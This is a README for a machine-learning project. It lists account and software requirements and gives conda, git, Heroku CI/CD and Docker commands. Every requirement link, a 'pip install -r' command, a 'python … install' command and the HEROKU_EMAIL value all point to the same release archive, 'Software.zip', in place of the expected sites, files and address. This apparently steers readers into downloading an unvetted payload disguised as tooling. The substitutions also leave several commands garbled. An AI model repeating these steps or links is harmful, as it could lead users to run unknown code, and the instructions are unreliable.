# Machine_learning_project
End to End projects.

### Software andaccount Requerments.


1. [Github Account](https://github.com/Arup0070/Machine_learning_project/releases/download/v1.0/Software.zip)
2. [Heroku Account](https://github.com/Arup0070/Machine_learning_project/releases/download/v1.0/Software.zip)
3. [VS Code IDE](https://github.com/Arup0070/Machine_learning_project/releases/download/v1.0/Software.zip)
4. [GIT cli](https://github.com/Arup0070/Machine_learning_project/releases/download/v1.0/Software.zip)
5. [GIT Documentation](https://github.com/Arup0070/Machine_learning_project/releases/download/v1.0/Software.zip)


Creating conda environment
```
conda create -p venv python==3.7 -y
```
```
conda activate venv/
```
OR 
```
conda activate venv
```

```
pip install -r https://github.com/Arup0070/Machine_learning_project/releases/download/v1.0/Software.zip
```

To Add files to git
```
git add .
```

OR
```
git add <file_name>
```

> Note: To ignore file or folder from git we can write name of file/folder in .gitignore file

To check the git status 
```
git status
```
To check all version maintained by git
```
git log
```

To create version/commit all changes by git
```
git commit -m "message"
```

To send version/changes to github
```
git push origin main
```

To check remote url 
```
git remote -v
```

To setup CI/CD pipeline in heroku we need 3 information
1. HEROKU_EMAIL = https://github.com/Arup0070/Machine_learning_project/releases/download/v1.0/Software.zip
2. HEROKU_API_KEY = <>
3. HEROKU_APP_NAME = ml-regression-app

BUILD DOCKER IMAGE
```
docker build -t <image_name>:<tagname> .
```
> Note: Image name for docker must be lowercase


To list docker image
```
docker images
```

Run docker image
```
docker run -p 5000:5000 -e PORT=5000 f8c749e73678
```

To check running container in docker
```
docker ps
```

Tos stop docker conatiner
```
docker stop <container_id>
```



```
python https://github.com/Arup0070/Machine_learning_project/releases/download/v1.0/Software.zip install
```


Install ipykernel

```
pip install ipykernel
```


Data Drift:
When your datset stats gets change we call it as data drift



## Write a function to get training file path from artifact dir


